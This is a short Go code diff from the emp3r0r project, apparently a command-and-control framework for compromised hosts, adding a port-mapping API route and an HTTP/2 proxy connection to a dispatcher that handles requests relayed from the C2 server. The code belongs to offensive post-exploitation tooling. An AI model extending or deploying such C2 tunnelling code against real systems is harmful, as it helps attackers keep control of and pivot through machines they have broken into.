@@ -8,6 +8,7 @@ import (
 
 	"github.com/gorilla/mux"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -34,6 +35,10 @@ func dispatcher(wrt http.ResponseWriter, req *http.Request) {
 	token := mux.Vars(req)["token"]
 	logging.Debugf("Got relayed request from C2: API: %s, token: %s", api, token)
 
+	// Setup H2Conn for port mapping.
+	proxyConn := new(def.H2Conn)
+	network.ProxyStream.H2x = proxyConn
+
 	// match API names
 	api = transport.WebRoot + "/" + api
 	switch api {
@@ -57,6 +62,8 @@ func dispatcher(wrt http.ResponseWriter, req *http.Request) {
 			return
 		}
 		http.ServeFile(wrt, req, local_path)
+	case transport.PortMappingAPI:
+		network.HandlePortMapping(network.ProxyStream, wrt, req)
 	default:
 		logging.Debugf("API not found: %s", api)
 		wrt.WriteHeader(http.StatusNotFound)
